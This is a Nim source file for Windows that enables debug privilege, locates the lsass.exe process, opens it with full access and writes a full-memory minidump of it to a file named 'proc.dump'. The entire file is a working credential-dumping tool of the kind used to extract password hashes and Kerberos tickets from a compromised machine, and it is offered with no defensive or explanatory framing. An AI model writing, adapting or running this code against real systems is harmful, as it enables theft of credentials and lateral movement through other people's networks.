import winim
proc EnableDebugPriv():bool=
    var 
        hToken:HANDLE 
        luid:LUID
        tokenPriv:TOKEN_PRIVILEGES
    defer: CloseHandle(hToken)        
    if not bool(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&amp;hToken)): #Open process token
        echo "get token error"
        return false
    if not bool(LookupPrivilegeValue(nil, SE_DEBUG_NAME, &amp;luid)):#Retrieve suid Enable the permission to debug other processes
        echo "Lookup SE_DEBUG_NAME error"
        return false
    tokenPriv.PrivilegeCount = 1
    tokenPriv.Privileges[0].Luid = luid
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    if not bool(AdjustTokenPrivileges(hToken, false, &amp;tokenPriv, cast[DWORD](sizeof(tokenPriv)), nil, nil)):#Enable access token privileges
        echo "error"
    return true        
proc to_string(szExeFile:openArray[WCHAR]):string=
    #var ret_string:string=""
    for i in szExeFile:
        if(char(i)=='\0'):
            break
        result.add(char(i))
    #return ret_string
proc get_lsass_pid(find_procss:string):DWORD=
    echo("start get lsass pid")
    #proc CreateToolhelp32Snapshot(dwFlags: DWORD; th32ProcessID: DWORD): HANDLE
    var 
        Snapshot_ret : HANDLE
        dwFlags = DWORD TH32CS_SNAPPROCESS
        th32ProcessID = DWORD TH32CS_SNAPALL
        lppe : PROCESSENTRY32 
        error : string
        process_name : string
    Snapshot_ret = CreateToolhelp32Snapshot(dwFlags,th32ProcessID)#Get the current process snapshot Return the open handle of the current process snapshot
    defer: CloseHandle(Snapshot_ret)#Close handle postpone closing
    if(Snapshot_ret!=INVALID_HANDLE_VALUE):
        echo("Successfully opened the snapshot handle is",Snapshot_ret)
        lppe.dwSize=cast[DWORD](sizeof(lppe))
        #proc Process32First(hSnapshot: HANDLE; lppe: LPPROCESSENTRY32W): WINBOOL
        if(Process32First(Snapshot_ret,&amp;lppe)): #Find the first process of the system snapshot   
            while Process32Next(Snapshot_ret,&amp;lppe): #Find the next process of the next system snapshot
                #process_name=`$$`(lppe.szExeFile)
                process_name=tostring(lppe.szExeFile)
                if(process_name==find_procss):
                     result=lppe.th32ProcessID
        else:    
            error="Process32First"
            echo("error for ",error)
            result = -1
    else:
        error="CreateToolhelp32Snapshot"
        echo("error for ",error)
        result = -1

when isMainModule:
    var
        find_procss:string
        procss_ret_pid:DWORD
    if not EnableDebugPriv():
        echo "error for EnableDebugPriv"
    procss_ret_pid = get_lsass_pid(find_procss="lsass.exe")
    if(procss_ret_pid == -1):
        echo("get ",find_procss," pid error")
        quit(-1)
    echo("find ",find_procss," pid is ",procss_ret_pid)

    var
        dwDesiredAccess=DWORD PROCESS_ALL_ACCESS
    #proc OpenProcess(dwDesiredAccess: DWORD; bInheritHandle: WINBOOL;dwProcessId: DWORD): HANDLE        
    var procss_jb=OpenProcess(dwDesiredAccess,false,procss_ret_pid)
    if not bool(procss_jb):
        echo("noAuthority")
        quit(-1)        

    var fs = open(r"proc.dump", fmWrite) #Ready to write file
    var MiniDumpWithFullMemory=0x00000002
    if not bool(MiniDumpWriteDump(procss_jb,procss_ret_pid,fs.getOsFileHandle(),cast[MINIDUMP_TYPE](MiniDumpWithFullMemory),nil,nil,nil)):
        echo("error is MiniDumpWriteDump")
